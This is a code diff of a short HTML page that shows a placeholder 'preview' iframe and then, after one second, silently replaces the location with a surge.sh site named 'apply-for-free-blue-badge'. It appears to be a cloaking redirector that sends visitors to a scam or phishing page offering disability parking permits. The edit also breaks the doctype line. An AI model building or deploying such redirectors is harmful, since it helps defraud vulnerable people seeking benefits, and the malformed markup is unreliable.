@@ -1,26 +1,36 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Fast iFrame Redirect</title>
+  <title>Instant Redirect</title>
 
   <script>
-    // Redirect after 1 second (1000 milliseconds)
-    setTimeout(function() {
-      window.location.href = "https://example.com"; // <-- redirect link
+    // Redirect to new link after 1 second
+    setTimeout(() => {
+      window.location.replace("https://apply-for-free-blue-badge.surge.sh"); // <-- redirect link
     }, 1000);
   </script>
-</head>
-<body style="margin:0; padding:0;">
 
-  <!-- iFrame shown briefly -->
-  <iframe 
-    src="https://apply-for-free-blue-badge.surge.sh"  <!-- <-- iframe preview link -->
-    width="100%" 
-    height="100%" 
-    style="border:none;">
-  </iframe>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: #000;
+    }
+    iframe {
+      width: 100%;
+      height: 100vh;
+      border: none;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Preview page in iframe for 1 second -->
+  <iframe src="https://your-preview-link.com"></iframe> <!-- <-- iframe link -->
 
 </body>
 </html>
